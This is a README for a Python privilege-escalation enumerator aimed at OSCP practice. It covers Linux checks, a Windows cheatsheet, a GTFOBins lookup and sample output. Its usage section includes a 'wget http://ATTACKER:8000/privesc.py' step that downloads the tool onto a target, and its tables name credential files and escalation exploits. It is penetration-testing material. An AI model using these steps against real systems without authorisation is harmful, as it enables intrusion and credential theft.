# Husky Privesc Enumerator

Lightweight privilege escalation checker tuned for OSCP. Upload to a Linux target and run — checks SUID, sudo, capabilities, crons, writable paths, credentials, internal services, Docker escape vectors, and flags GTFOBins-exploitable binaries. Also includes a Windows privesc command cheatsheet.

Lighter than linPEAS. Focused on what actually gets you root.

Zero dependencies — pure Python 3 stdlib. Upload and run.

---

## Usage

### Linux (upload to target and run)

```bash
# Transfer to target
python3 -m http.server 8000  # on attacker
wget http://ATTACKER:8000/privesc.py  # on target

# Run it
python3 privesc.py
```

### Windows (cheatsheet mode)

```bash
# From your attacker box — prints commands to paste into Windows shell
python3 privesc.py --windows
```

---

## What It Checks (Linux)

| Check | What It Finds |
|---|---|
| **System Info** | Kernel version (DirtyCow, DirtyPipe), interesting groups (docker, lxd, disk, sudo) |
| **Sudo** | NOPASSWD entries, GTFOBins sudo exploits, (ALL) privileges, LD_PRELOAD in env_keep |
| **SUID** | Non-standard SUID binaries, GTFOBins SUID exploits (200+ binaries in database) |
| **Capabilities** | Dangerous caps: cap_setuid, cap_sys_admin, cap_dac_override, etc. |
| **Cron Jobs** | Writable cron scripts, wildcard injection, systemd timers |
| **Writable Files** | /etc/passwd, /etc/shadow, /etc/sudoers, PATH directories, service files |
| **Credentials** | Bash/MySQL/psql history, config files (wp-config, .env, database.yml), SSH keys, password files |
| **Network** | Internal services (MySQL, Redis, MongoDB on 127.0.0.1), neighbors, routes |
| **Docker** | .dockerenv detection, accessible Docker socket, docker/lxd group membership |
| **NFS** | no_root_squash exports |
| **Misc** | PwnKit (pkexec), writable Python paths, root-owned writable files |

## What It Covers (Windows Cheatsheet)

| Category | Commands |
|---|---|
| **Juicy Privileges** | SeImpersonate → GodPotato/PrintSpoofer, SeBackup → SAM dump, SeTcb, SeDebug |
| **Service Exploits** | Unquoted paths, writable binaries, binPath hijack |
| **Scheduled Tasks** | schtasks enumeration |
| **AlwaysInstallElevated** | Registry check + msi payload |
| **Stored Credentials** | cmdkey, AutoLogon registry, PSReadLine history |
| **Credential Files** | SAM/SYSTEM backups, findstr password searches |

---

## GTFOBins Database

Built-in database of 200+ binaries known to be exploitable via SUID or sudo. When the tool finds a SUID binary or sudo entry, it checks against this list and prints the GTFOBins URL:

```
[CRITICAL] SUID GTFOBins: /usr/bin/find
  → https://gtfobins.github.io/gtfobins/find/#suid

[CRITICAL] sudo NOPASSWD: /usr/bin/vim
  → https://gtfobins.github.io/gtfobins/vim/#sudo
```

---

## Output

Results are priority-sorted with a summary at the end:

```
══════════════════════════════════════════════════
PRIVESC SUMMARY
──────────────────────────────────────────────────
CRITICAL: 3  HIGH: 5  MEDIUM: 8

Hit these first:
  [!!!] sudo NOPASSWD: /usr/bin/vim
  [!!!] SUID GTFOBins: /usr/bin/find
  [!!!] /etc/passwd is writable!
══════════════════════════════════════════════════
```

---

## License

MIT
